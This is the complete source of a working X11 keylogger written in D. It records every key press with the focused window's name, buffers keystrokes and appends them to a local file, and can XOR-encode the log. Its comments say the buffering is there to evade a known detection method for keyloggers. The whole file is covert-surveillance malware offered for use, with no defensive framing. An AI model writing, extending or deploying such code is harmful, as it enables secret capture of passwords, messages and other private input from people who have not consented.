import std.stdio;
import x11.X;
import x11.keysym;
import x11.Xlib;
import x11.Xutil;
import std.conv;
import std.file;
import std.array;
import core.sys.posix.signal;


// The file our keylog will be written to
enum saveFile = "test.txt";

// Our xor key. 
// As the keys we're logging are only 1 byte, only a 1 byte key is needed
enum xorKey = "A";

// If uncommented this line compiles in the xor code
// version = USEXOR;

// The name of the current window
string currentWindowName;

// The name of the last window the user typed in
string lastWindowName;

// If this is true then we have been sent sigint and should die
bool doQuit;

// Our keybuffer. We store our pressed keys in this buffer before writing them
// to disk in order to avoid detection. (It's possible to check for keyloggers
// by sending a process X bytes of key strokes and then checking if that program
// writes X bytes to disk)
string[] keyBuffer;

// The max size of the key buffer before being written to disk
int maxKeyBufferLength = 100;

void main() {
	// Our signal handlers
	signal(SIGINT, &handler);
	signal(SIGTERM, &handler);
	// Set the error handler to our custom handler
	XSetErrorHandler(&errorHandler);
	Display* d = XOpenDisplay(null);
    Window root = DefaultRootWindow(d);
    Window curFocus;
    char[17] buf;
    KeySym ks;
    XComposeStatus comp;
    int len;
    int revert;
	XGetInputFocus(d, &curFocus, &revert);
    XSelectInput(d, curFocus, KeyPressMask|KeyReleaseMask|FocusChangeMask);
	currentWindowName = getFocusedWindowName(d, curFocus);
	while (true) {
		// Check if we should write our log to disk
		if (keyBuffer.length >= maxKeyBufferLength || doQuit) {
			writeLog();
		}
		// Check is we should exit
		if (doQuit) {
			break;
		}
		
        XEvent ev;
        XNextEvent(d, &ev);
        switch (ev.type) {
			case FocusOut:
                if (curFocus != root) {
                    XSelectInput(d, curFocus, 0);
				}
		
                XGetInputFocus(d, &curFocus, &revert);
                if (curFocus == PointerRoot) {
                    curFocus = root;
				}
                XSelectInput(d, curFocus, KeyPressMask|KeyReleaseMask|FocusChangeMask);
				currentWindowName = getFocusedWindowName(d, curFocus);
				debug {
					writefln("Current focus is: %d", curFocus);					
				}
                break;

            case KeyPress:
				len = XLookupString(&ev.xkey, buf.ptr, 16, &ks, &comp);
                string pressedkey = getKey(cast(int)ks);
				if (pressedkey != null) {
					logKey(pressedkey);
				} else {
                	buf[len]=0;
					// Check if XLookupString failed to return a value for the key code
					if (buf[0] == '\0') {
						debug {
							writefln("Could not key for keycode %d", cast(int)ks);
						}
						logKey("[" ~ to!string(cast(int)ks) ~ "]");
					} else {
						logKey(to!string(buf[0]));
					}
				}
				debug {
					writefln("Key code: %d", cast(int)ks);
					if (pressedkey != null) {
						writefln("Pressed key: %s", pressedkey);
					} else {
                		buf[len]=0;
                		writefln("Pressed key: %s", buf[0]);
					}
				}
			default: break;
        }
    }
}

// Takes a string and adds it to the keybuffer
void logKey(string key) {
	version(USEXOR) {
		key = xor(key, xorKey);
	}
	// lastWindowName is the name of the last window that the user typed in
	// if it has changed than the user has focused a new window and we should
	// update the log
	if (lastWindowName != currentWindowName) {
		lastWindowName = currentWindowName;
		keyBuffer ~= "\n" ~ currentWindowName ~ "\n";
	}
	// Add a space to each key so we can tell if a user
	// pressed a key or typed 
	// (Tell if they pressed Tab (Will show up as "[tab]") or typed Tab (will show up as "[ T a b ] "))
	keyBuffer ~= key ~ " ";
	writefln("keyBuffer size: %d", keyBuffer.length);
}

// This function writes our keylog to disk
void writeLog() {
	std.file.append(saveFile, cast(void[])(join(keyBuffer)));
	keyBuffer = null;
}

// Mapping some special keys to common names
string getKey(int key) {
	switch (key) {
		case 32: return "[space]";
		case 65288: return "[backspace]";
		case 65289: return "[tab]";
		case 65293: return "[enter]";
		case 65360: return "[home]";
		case 65361: return "[larrow]";
		case 65362: return "[uarrow]";
		case 65363: return "[rarrow]";
		case 65364: return "[darrow]";
		case 65365: return "[pageup]";
		case 65367: return "[end]";
		case 65379: return "[insert]";
		case 65407: return "[numlock]";
		case 65421: return "[numlockenter]";
		case 65429: return "[numpadhome]";
		case 65430: return "[numpadlarrow]";
		case 65431: return "[numpaduarrow]";
		case 65432: return "[numpadrarrow]";
		case 65433: return "[numpaddarrow]";
		case 65434: return "[numpadpageup]";
		case 65435: return "[numpadpagedown]";
		case 65505: return "[lshift]";
		case 65506: return "[rshift]";
		case 65507: return "[lctrl]";
		case 65508: return "[rctrl]";
		case 65509: return "[capslock]";
		case 65513: return "[lalt]";
		case 65514: return "[ralt]";
		case 65535: return "[delete]";
		default: return null;
	}
}

// A xor to encrypt our keylogs
// TODO Rewrite to use keys logger than 1 byte
string xor(string temp, string k) {
    int x = 0;
    string toReturn;
    for (int i = 0; temp.length > i; i++) {
        if (x > k.length - 1) {
            x = 0;
        }
        toReturn = toReturn ~= temp[i] ^ k[x];
        x++;
    }
    return toReturn;
}

// This func is here for when the user closes a window causing XGetInputFocus(d, &curFocus, &revert);
// to throw a badWindow error. We just return 0 because there's no need to try to recover from the 
// error as it will sort itself when the user clicks on a new window
extern (C) int errorHandler(_XDisplay*, XErrorEvent*) nothrow
{
	debug {
		printf("There was an X error\n");
	}
    return 0;
}

// This returns the name of the current focused window inside some []
// or the string [???] if the window is nameless
string getFocusedWindowName(_XDisplay* d, ulong focus) {
	char* winName;
	XFetchName(d, focus, &winName);
	if (winName == null) {
		// Focus might be a child window (Which means it has no name) 
		// so we try to get the parent window id
		Window parent;
		Window root;
		uint nchildren;
		Window* children;
		int wasChild = XQueryTree(d, focus, &root, &parent, &children, &nchildren);
		if (wasChild == 1) {
			XFetchName(d, parent, &winName);
		} else {
			debug {
				writefln("Window %d has no name", focus);
			}
			return "[???]";
		}
	}
	return "[" ~ to!string(winName) ~ "]";
}

// Catch SIGINT/SIGTERM and write our keylogs to disk before exiting
extern(C) void handler(int num) nothrow @nogc @system
{
    printf("Caught signal %d\n",num);
    doQuit = true;
}
